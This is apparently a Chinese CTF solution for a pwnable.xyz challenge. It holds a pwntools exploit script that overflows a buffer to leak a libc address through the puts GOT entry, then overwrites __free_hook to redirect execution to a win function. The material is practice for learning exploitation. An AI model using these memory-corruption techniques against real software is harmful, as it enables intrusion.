### 知识点

- libc base

- __free_hook
- snprintf



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
libc = ELF('./alpine-libc-2.23.so')
puts_got = e.got['puts']
win_address = e.symbols['win']
puts_offset = libc.symbols['puts']
freehook_offset = libc.symbols['__free_hook']
info('win address:' + hex(win_address))
info('puts got:' + hex(puts_got))


p = remote('svc.pwnable.xyz', 30037)
# p = process('./challenge')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'1')

payload = b'a' * 0x20 + p64(puts_got).rstrip(b'\x00') + b'a'
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'BMW')
p.sendlineafter(b': ', payload)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'aa')
p.sendlineafter(b': ', payload)

# gdb.attach(p)
p.sendlineafter(b'> ', b'4')
leak = p.recvuntil(b'Menu:')[:-6]
leak = leak.split(b': ')[-1]
puts_addr = u64(leak.ljust(8, b'\x00'))
libc_base = puts_addr - puts_offset
freehook_addr = libc_base + freehook_offset
info('puts address:' + hex(puts_addr))
info('libc base:' + hex(libc_base))
info('freehook address:' + hex(freehook_addr))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'1')

payload = b'a' * 0x20 + p64(freehook_addr).rstrip(b'\x00') + b'a'
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'BMW')
p.sendlineafter(b': ', payload)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'aa')
p.sendlineafter(b': ', payload)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'')
p.sendlineafter(b': ', p64(win_address))

# gdb.attach(p)
p.interactive()

```

